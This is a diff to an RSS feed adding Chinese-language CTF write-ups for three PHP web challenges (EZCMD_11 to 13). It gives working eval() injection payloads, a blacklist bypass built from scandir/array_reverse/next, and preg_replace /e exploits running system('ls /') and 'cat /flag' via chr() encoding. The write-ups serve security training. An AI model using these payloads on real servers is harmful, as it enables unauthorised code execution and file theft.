@@ -1778,10 +1778,177 @@ payload ?qc=echo file_get_contents(&amp;rsquo;/flag.txt&amp;rsquo;)?&amp;gt;&lt;
 	
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;ezcmd_11&#34;&gt;EZCMD_11
-&lt;/h3&gt;&lt;h3 id=&#34;ezcmd_12&#34;&gt;EZCMD_12
-&lt;/h3&gt;&lt;h3 id=&#34;ezcmd_13&#34;&gt;EZCMD_13
-&lt;/h3&gt;&lt;h3 id=&#34;ezcmd_14&#34;&gt;EZCMD_14
-&lt;/h3&gt;</description>
+&lt;/h3&gt;&lt;p&gt;访问靶机&lt;br&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c33.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
+分析条件&lt;br&gt;
+qc 参数会进入 eval($qc),只过滤了分号 ; flag 在 flag.php 里&lt;br&gt;
+直接构造highlight_file(&amp;lsquo;flag.php&amp;rsquo;)?&amp;gt; 读取flag即可&lt;br&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c34.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ezcmd_12&#34;&gt;EZCMD_12
+&lt;/h3&gt;&lt;p&gt;访问靶机&lt;br&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c35.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
+分析条件&lt;br&gt;
+可以看出这题本质是 eval() 代码执行，只是做了一层黑名单过滤.&lt;br&gt;
+被过滤的字符很多，尤其关键的是：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39; &amp;#34; ? &amp;lt; &amp;gt; . $ { } : \ ~ ^ @ * - + = [ ] ,
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这意味着：不能直接写 flag.php，因为 . 被过滤。不能方便地写字符串、数组下标、拼接这些常规做法。但函数名、括号、分号、下划线都还能用，所以可以继续走纯 PHP 利用.&lt;br&gt;
+先用目录函数确认当前目录文件:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;print_r(scandir(getcwd()));\
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c36.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
+目标是不直接写出 flag.php，而是从 scandir() 返回结果里间接取出它.&lt;br&gt;
+构造：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;next(array_reverse(scandir(getcwd())))
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;原因是:&lt;br&gt;
+scandir(getcwd()) 返回 [&amp;rsquo;.&amp;rsquo;,&amp;rsquo;..&amp;rsquo;,&amp;lsquo;flag.php&amp;rsquo;,&amp;lsquo;index.php&amp;rsquo;]  array_reverse() 后变成 [&amp;lsquo;index.php&amp;rsquo;,&amp;lsquo;flag.php&amp;rsquo;,&amp;rsquo;..&amp;rsquo;,&amp;rsquo;.&amp;rsquo;]  next() 取第二个元素，正好就是 flag.php &lt;br&gt;
+虽然 next() 正常要求传引用变量，但这里 error_reporting(0) 把 warning 压掉了，实际仍然能拿到值.&lt;br&gt;
+最终payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;show_source(next(array_reverse(scandir(getcwd()))));
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c37.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ezcmd_13&#34;&gt;EZCMD_13
+&lt;/h3&gt;&lt;p&gt;访问靶机&lt;br&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c38.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
+分析条件&lt;br&gt;
+preg_replace() 使用了 /e 修饰符,在 PHP 5.x 里，/e 会把替换内容当成 PHP 代码执行,利用思路是让 \1 替换成我们可控的内容，再借助双引号里的 ${&amp;hellip;} 字符串插值触发函数执行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?re=.*&amp;amp;str=${phpinfo()}  
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c39.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
+可以成功弹出 phpinfo()，说明利用成立&lt;br&gt;
+接着尝试命令执行  PHP 5.6 的特性：未定义常量会被当成字符串.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?re=.*&amp;amp;str=${system(ls)}  
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c40.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
+回显当前目录只有index.php 说明flag不在当前目录,继续列根目录&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?re=.*&amp;amp;str=${system(chr(108).chr(115).chr(32).chr(47))}  
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c41.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
+也就是 ls /  回显里可以看到flag 说明flag在flag文件中  最后读出flag&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?re=.*&amp;amp;str=${system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103))}  
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;等价执行了 cat /flag&lt;br&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c42.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+</description>
         </item>
         
     </channel>
